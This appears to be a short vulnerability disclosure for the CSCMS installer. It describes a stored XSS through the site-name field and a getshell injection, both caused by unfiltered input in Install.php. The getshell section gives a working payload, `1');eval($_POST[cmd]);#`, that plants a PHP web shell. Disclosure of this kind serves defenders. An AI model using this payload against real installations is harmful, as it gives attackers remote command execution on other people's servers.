# CSCMS_XSS
-----

### Code analysis
Vulnerability code is located `\upload\plugins\sys\Install.php` 103 to 150 lines
![XSS1](https://github.com/AvaterXXX/CScms/blob/master/images/1.png)
You can see that only the null value is judged in the source code, and the input is not filtered, so you can submit the XSS statement.

### Vulnerability display
Insert XSS statement at the site name
![XSS2](https://github.com/AvaterXXX/CScms/blob/master/images/2.png)
Click to complete the installation
![XSS3](https://github.com/AvaterXXX/CScms/blob/master/images/3.png)

# CSCMS_GETSHELL
------
### Code analysis
Vulnerability code is located `\upload\plugins\sys\Install.php` 103 to 150 lines
![XSS1](https://github.com/AvaterXXX/CScms/blob/master/images/1.png)
You can see that only the null value is judged in the source code, and the input is not filtered.
### Vulnerability display
use payload `1');eval($_POST[cmd]);#`
![](https://github.com/AvaterXXX/CScms/blob/master/images/getshell1.png)

getshell!
![](https://github.com/AvaterXXX/CScms/blob/master/images/getshell2.png)


